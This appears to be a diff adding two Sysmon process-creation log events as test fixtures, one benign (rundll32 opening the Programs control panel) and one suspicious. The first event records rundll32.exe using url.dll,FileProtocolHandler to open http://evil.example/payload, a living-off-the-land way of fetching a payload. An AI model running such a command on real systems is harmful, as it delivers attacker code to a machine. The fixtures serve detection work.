@@ -1,0 +1,2 @@
+{"Timestamp":"2026-01-15T10:15:00Z","EventID":1,"Channel":"Sysmon","Computer":"PC-01","User":"PC-01\\bob","Image":"C:\\Windows\\System32\\rundll32.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"rundll32.exe url.dll,FileProtocolHandler http://evil.example/payload"}
+{"Timestamp":"2026-01-15T10:15:04Z","EventID":1,"Channel":"Sysmon","Computer":"PC-01","User":"PC-01\\bob","Image":"C:\\Windows\\System32\\rundll32.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl"}
